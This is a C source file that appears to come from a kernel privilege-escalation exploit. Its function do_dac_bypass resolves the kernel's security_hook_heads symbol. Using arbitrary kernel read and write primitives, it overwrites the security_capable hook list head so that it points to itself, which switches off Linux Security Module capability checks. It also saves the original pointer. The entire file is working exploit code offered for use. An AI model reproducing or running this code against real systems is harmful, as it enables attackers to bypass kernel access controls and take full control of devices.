#include <stdio.h>

#include "kallsyms.h"
#include "kernel_rw.h"
#include "dac_bypass.h"
#include "kernel_defs.h"

int32_t do_dac_bypass(uint64_t* ppSecurityHookHeads, uint64_t* ppSecurityCapableListItem)
{
    int32_t iRet = -1; 
    uint64_t pSecurityHookHeads = 0;
    uint64_t pSecurityCapableListHead = 0;
    uint64_t pSecurityCapableListItem = 0;

    pSecurityHookHeads = get_kernel_sym_addr("security_hook_heads");

    if(!IS_KERNEL_POINTER(pSecurityHookHeads))
    {
        printf("[-] failed to get address of security_hook_heads!\n");
        goto done;
    }

    printf("[+] found security_hook_heads ptr: %lx\n", pSecurityHookHeads);

    pSecurityCapableListHead = pSecurityHookHeads + SECURITY_CAPABLE_OFFSET;
    pSecurityCapableListItem = kernel_read_ulong(pSecurityCapableListHead);

    if(!IS_KERNEL_POINTER(pSecurityCapableListItem))
    {
        printf("[-] failed to get security_capable list item!\n");
        goto done;
    }

    if(sizeof(uint64_t) != kernel_write_ulong(pSecurityCapableListHead, pSecurityCapableListHead))
    {
        printf("[-] failed to overwrite security_capable hook!\n");
        goto done;
    }

    *ppSecurityHookHeads = pSecurityHookHeads;
    *ppSecurityCapableListItem = pSecurityCapableListItem;

    iRet = 0;

done:
    return iRet;
}